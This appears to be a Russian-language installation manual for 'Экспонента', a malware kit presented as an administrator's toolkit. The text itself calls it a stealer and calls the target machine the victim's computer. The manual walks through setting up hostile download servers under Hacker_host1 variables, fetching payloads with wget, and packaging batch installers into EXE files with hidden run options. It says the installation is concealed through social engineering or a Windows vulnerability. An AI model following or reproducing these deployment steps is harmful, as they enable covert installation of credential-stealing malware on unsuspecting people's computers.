ИНСТАЛЛЯЦИЯ АДМИН-ПАКА «ЭКСПОНЕНТА»
=====================================

В каталоге содержатся основные модули админ-пака «Экспонента». Файлы используются для общих администраторских нужд, восстановления доступа к серверу после хакерской атаки на него,  а также для установки академического варианта стайлера. Файлы дистрибутива рабочие, тестировались в бета-версии.

ПРИНЦИП РАБОТЫ УСТАНОВЩИКА
==========================

После инсталляции файлов админ-пака в окружении операционной системы ведомого компьютера Windows появляются следующие переменные:

- _Hacker_host1_ – доменное имя публичного хоста, с которого скачивается установочные файлы и публичные обновления Админ-пака. Может использоваться как основной хост, так и его многочисленные зеркала

- ELEVATION — переменная, указывающая на каталог, в котором расположены файлы пакета Elevation, который также является частью админ-пака. Пакет Elevation предназначен для временного повышения прав учётной записи на рабочей станции или сервере для администраторских нужд. В этот же каталог устанавливаются файлы из пакета AdminT (управление запуском служб, остановкой процессов и некоторые служебные программы).

- PUB1 — корневая папка админ-пака. В ней расположена папка Util с дополнительными программами и скриптами для администрирования, папка Distrib, в которой хранятся скаченные модули и обновления админ-пака, а также различных «зловредов», которые распространяются как дополнение к админ-паку.

- UTIL -- папка с дополнительными утилитами Админ-пака (устанавливается опционально)

Также появляется файл %PUB1%\Distrib\plugins\installmaindistrib.ini, в котором находятся настройки публичного хоста или зеркала для скачки и установки (обновлении) основных файлов админ-пака в каталог %PUB1%\Distrib\plugins, и файл %PUB1%\Distrib\plugins\InstallMainExponenta.bat для собственно установки админ-пака.

На приватном хосте создаются аккаунты «хозяина» HTTP сервера с поддержкой технологии WebDAV и/или публичного FTP сервера. Набор находящихся в нём программ одинаковый, и представляет собой все компилированные версии основного модуля и плагинов Админ-пака, а также файлы InstallMainExponenta.bat, installmaindistrib.ini, и дополнительные файлы installmaindistrib.bat, loadftpmaindistrib.bat, loadhttpmaindistribbat для собственно скачки и установки пакетов из удалённого репозитория.

Удалено.

В переменной Path прописываются пути для каталогов %UTIL%, %ELEVATION%, %PUB1%\Util, чтобы программы и скрипты Админ-пака могли запускаться без префикса этих переменных из командной строки.

ИСХОДНЫЕ ДАННЫЕ
===============

Для установки админ-пака “Экспонента” вам дополнительно потребуется следующее рабочее окружение:

- веб-адрес публичного HTTP хостинга файлов Админ-пака. Хостинг выбирается произвольно, на Ваш вкус. Доменное имя этого публичного хостинга указывается в переменной httphost.

- веб-адрес анонимного FTP хостинга файлов Админ-пака. Хостинг выбирается произвольно, на Ваш вкус. Доменное имя этого публичного хостинга указывается в переменной ftphost.

- путь к основной папке с файлами плагинов Админ-пака на веб сервере. Он записывается в переменную httpMainFolder

- префикс веб-сервера хостинга, записываемый в переменную httppref. Может принимать значение http или https

- порт, на котором работает веб-сервер. Записывается в переменную httpport. Его стандартное значение — 80.

- логин авторизации пользователя на веб-сервере, если веб-сервер не публичный. Записывается в переменную httpuser

- пароль авторизации пользователя на веб-сервере. Записывается в переменную httppassword.

Примечание. Для публичных серверов эти два значения можно оставить пустыми

- порт, на котором работает ftp-сервер. Записывается в переменную ftpport. Его стандартное значение — 21.

- логин авторизации пользователя на веб-сервере, если веб-сервер не анонимный. Для анонимного сервера значение по-умолчанию anonymous. Записывается в переменную ftpuser

- пароль авторизации пользователя на веб-сервере. Записывается в переменную ftppassword.

- маска файлов, по которой будут скачиваться программы с ftp сервера. По-умолчанию * (все файлы)

FTP сервер поддерживает иерархию вложенных подкаталогов вплоть до трёх уровней, что позволяет достаточно комфортно размещать файлы на любом хостинге. Имя каталога первого уровня записывается в переменную ftpMainFolder, второго уровня — ftpSubFolder, третьего уровня — ftpSubFolder1. В каждой переменной может быть только один идентификатор, однако если папка с данным уровнем вложености отсутствует, её можно оставить пустой. Соответственно, если нужно забрать файлы из корня ftp сервера все папки следует указать пустыми. Но это плохая идея... Для веб-сервера путь к папкам может комбинироваться, например httpMainFolder=MainFolder/SubFolder/SubFolder1. Для FTP сервера же нужно использовать три переменные. Это неудобство связано с работой консольного FTP клиента Windows.

Заметим также, что переменные httppassword и ftppassword не имеют ничего общего с переменной Hacker_Pass, а переменные httpuser и ftpuser — с переменной Hacker_User. Как говориться, мухи отдельно, суп отдельно...

Все переменные хранятся в файле installmaindistrib.ini, из которого они беруться скриптами установки и обновления файлов Админ-пака.

ОРГАНИЗАЦИЯ СЕРВЕРА Hacker_host1
================================

На веб-сервере с доменным именем, сохранённой в переменной Hacker_host1, в корне создаётся папка: “Exponenta”. В ней содержится установщик Админ-пака, установщики плагинов и  инсталляторы. Учтите, что все файлы, расположенные в этом каталоге, будут скачены с сервера на компьютер жертвы без изменений! Это значит, что там будут только универсальные файлы. Желательно, чтобы эту папку мог проматривать как оглавление каталога, поэтому в файле .htaccess должны быть выставлены соответствующие разрешения.

На FTP-сервере с доменным именем, сохранённой в переменной Hacker_host1, в корне создаётся символическая ссылка "Exponenta" на папку "Exponenta" на веб-сервере. Для этого на хостинге желательно также иметь SSH оступ.

Файл, который устанавливает стайлер вместе с плагинами — InstallMainExponenta.bat Пример его кода приведён в этой папке. Этот файл рабочий, и используется для локальной установки Админ-пака путём запуска этого файла из командной строки с повышенными привилегиями. Для работы этот файл (в текущей редакции) требует наличие в том же каталоге файлов:

- ExponentaMainFilesSetup.exe с главными файлами стайлера;

- HiddenStartSetupRePack.exe с плагином-пакетом Hidden Start;

- ElevationSetupRepack.exe с плагином-пакетом Elevation;

- AdminTExponentaPluginSetup.exe – с плагином-пакетом AdminTemplate;

Это минимальный рабочий набор инсталлятора. Файлы присутствуют в каталоге Exponenta на сервере в обязательном порядке. Назначение других дополнительных файлов будет написано ниже.

В этом же каталоге присутствуют файлы descript.ion, INSTALL.MD, install.rtf и install.html. Они несут только информационную нагрузку, и для работы Админ-пака не требуются.

Применительно к серверу Apache, «хозяин» должен дополнительно установить на сервер модули dav, dav_fs,  поддержки базовой аутентикации, а в описаниях каталогов этих серверов указать опции “Dav On” и директивы поддержки базовой аутентикации. Кроме того, создаётся файл с учётными записями для базовой аутентикации в корневом каталоге сервера и запрещается к нему доступ со стороны веб-сервера. В принципе, файлы для создания и конфигурации хостинга на сервере Zomro указаны в каталоге /Files/Server-Init.


СОЗДАНИЕ ДИСТРИБУТИВА ДЛЯ УСТАНОВКИ ЧЕРЕЗ ИНТЕРНЕТ
==================================================

Устанавливать файлы админ-пака локально или через удалённый доступ — хорошая идея, но не со всех сторон. Поскольку пакет для работы требует Интернет, то и устанавливаться он должен также из Интернета. Ниже будет рассказано, как подготовить файл для загрузки пакета из Интернета и сокрытия установки методами социальной инженерии и/или использования уязвимости Microsoft Windows.


Подготовка установочного файла

Для «нормальной» установки стайлера в этом каталоге присутствуют файлы:

- loadftpmaindistrib.bat — файл, скачивающий и устанавливающий файлы дистрибутива Админ-пака «Экспонента» по FTP протоколу;

- loadhttpmaindistrib.bat — файл, скачивающий и устанавливающий файлы дистрибутива Админ-пака «Экспонента» по HTTP протоколу;

- installmaindistrib.bat — файл, устанавливающий Админ-пак «Экспонента» и локального каталога;

- installmaindistrib.ini — файл с настройками переменных окружения этих командных файлов, кастомизированного под конкретный ведомый компьютер.

ПРИМЕЧАНИЕ. В данном дистрибутиве файл распространяется без параметров. Вы сами должны его заполнить валидными параметрами, исходя из данной инструкции.

- wget.exe — собственно программа для скачки установочных файлов с сервера Hacker_host1

Назначение первых двух файлов — открытие портов для FTP и веб-клиента, подготовка файла сценария и скачивание дистрибутива этим клиентом, а также запуск локального установщика стайлера. Информацию для этого пакетный файл получает из ini файла.

Теперь для запуска процесса инсталляции нужно, поместить файлы 

- loadftpmaindistrib.bat
- loadhttpmaindistrib.bat
- installmaindistrib.bat
- installmaindistrib.ini
- InstallMainExponenta.bat
- wget.exe

в один каталог, и запустить один из трёх первых файлов с повышенными привилегиями. Вариант, как это сделать на практике, смотри ниже.

ПОДГОТОВКА EXE ФАЙЛА ДЛЯ УСТАНОВКИ АДМИН-ПАКА ИЗ ИНТЕРНЕТА
==========================================================

- Скопируйте все файлы из каталога DEST-MAIN в рабочий каталог, и добавьте туда же файл wget.exe.
- Запустите файл battoexeconverter.
- Загрузите в него один из файлов: loadftpmaindistrib.bat, loadhttpmaindistrib.bat, installmaindistrib.bat.
- В расположенном справа окне опций исправьте их если потребуется. Может потребоваться изменение опций видимости программы при запуске, и метаданные программы.
- Нажмите кнопку "Конвертировать".
- Выберите имя и кталог сохранения полученного exe файла.
- Перешлите файл на ведомый компьютер для установки.
